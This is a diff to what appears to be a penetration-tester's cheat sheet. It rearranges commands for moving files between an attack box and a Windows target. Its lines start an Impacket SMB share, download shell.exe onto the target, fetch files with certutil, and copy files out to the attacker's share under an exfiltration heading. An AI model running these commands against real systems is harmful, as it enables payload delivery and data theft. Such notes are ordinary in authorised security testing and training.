@@ -149,10 +149,6 @@ ____
 [Windows One liners for file uploading](https://www.asafety.fr/en/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/)     
 
 **try certutil first - sometimes Powershell has problems, check size of file to see if transfer was successful** 
-
-    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
-    copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe
-
     certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat    
     
 ## Powershell
@@ -229,9 +225,11 @@ Need to change /etc/proxychains4.conf socks4 to socks5 on attack box
  # Post Exploitation / Exfiltration 
  [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)    
  
-     python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS 
-     net use \\IP\share /USER:USER PASS  
-     copy FILE \\IP\share\FILE  
+     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .                         #only on a trusted network (no password)   
+     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS        
+     net use \\IP\share /USER:USER PASS    
+     copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe               #download from kali   
+     copy C:\File \\[attack ip]\shareName\File                           #upload to kali  
 
  ## AV Evasion  
  ### Check for AV  
